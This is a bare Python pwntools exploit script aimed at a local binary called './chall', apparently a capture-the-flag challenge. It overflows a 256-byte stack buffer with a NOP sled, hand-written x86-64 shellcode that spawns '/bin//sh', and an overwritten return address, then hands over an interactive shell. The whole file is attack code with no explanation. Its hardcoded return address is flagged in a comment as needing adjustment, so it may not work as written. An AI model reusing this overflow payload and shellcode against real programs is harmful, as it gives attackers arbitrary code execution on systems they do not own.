from pwn import *

# Start the process
p = process('./chall')

# Define shellcode
shellcode = b"\x48\x31\xc0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\xb9\x2e\x2f\x00\x00\x51\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05"

# Calculate buffer size
buffer_size = 256  # 0x100
nop_sled = b"\x90" * (buffer_size - len(shellcode) - 8)  # NOP sled
ret_address = p64(0x11b4)  # Replace with the address of the buffer (adjust as needed)

# Construct the payload
payload = nop_sled + shellcode + b"A" * 8 + ret_address

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
